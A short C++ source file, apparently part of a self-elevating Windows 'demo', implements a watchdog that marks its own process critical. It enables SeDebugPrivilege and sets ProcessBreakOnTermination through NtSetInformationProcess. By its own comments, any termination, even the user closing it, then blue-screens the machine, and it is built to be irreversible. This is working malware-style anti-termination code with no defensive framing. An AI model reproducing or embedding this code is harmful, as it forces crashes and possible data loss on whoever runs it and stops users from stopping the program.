// Watchdog: marks the process as "critical" (ProcessBreakOnTermination).
// Once armed, ANY termination of this process — kill, crash, taskkill,
// user closing it — triggers a bugcheck on >= Windows XP:
//   CRITICAL_PROCESS_DIED (0xE8).
// There is no safe way to unarm it; designed to be irreversible.
#include "critical.h"

#include <windows.h>

namespace {
    // ProcessBreakOnTermination, NtSetInformationProcess info class.
    const ULONG kProcessBreakOnTermination = 0x1D;

    // SeDebugPrivilege RID.
    const ULONG kSeDebugPrivilege = 20;

    typedef LONG(NTAPI* pfnNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
    typedef LONG(NTAPI* pfnRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

    bool EnableSeDebug()
    {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll)
            return false;

        pfnRtlAdjustPrivilege RtlAdjustPrivilege =
            reinterpret_cast<pfnRtlAdjustPrivilege>(
                GetProcAddress(ntdll, "RtlAdjustPrivilege"));
        if (!RtlAdjustPrivilege)
            return false;

        BOOLEAN wasEnabled = FALSE;
        // The demo already self-elevates via UAC; this just makes the
        // privilege explicit for NtSetInformationProcess.
        return RtlAdjustPrivilege(kSeDebugPrivilege, TRUE, FALSE, &wasEnabled) == 0;
    }
}

namespace Watchdog {

    void Arm()
    {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll)
            return;

        pfnNtSetInformationProcess NtSetInformationProcess =
            reinterpret_cast<pfnNtSetInformationProcess>(
                GetProcAddress(ntdll, "NtSetInformationProcess"));
        if (!NtSetInformationProcess)
            return;

        EnableSeDebug();

        // A BOOLEAN works: Windows only reads the low byte as a flag,
        // but samples historically pass a full ULONG; keep separation
        // of the raw info class from the patch payload.
        ULONG breakOnTermination = 1;
        ULONG lastStatus = 0;
        lastStatus = NtSetInformationProcess(
            GetCurrentProcess(),
            kProcessBreakOnTermination,
            &breakOnTermination,
            sizeof(breakOnTermination)
        );

        // lastStatus is deliberately ignored. There is nothing saner
        // to do on failure — if it could not be armed, the process
        // just stays killable.
        (void)lastStatus;
    }

} // namespace Watchdog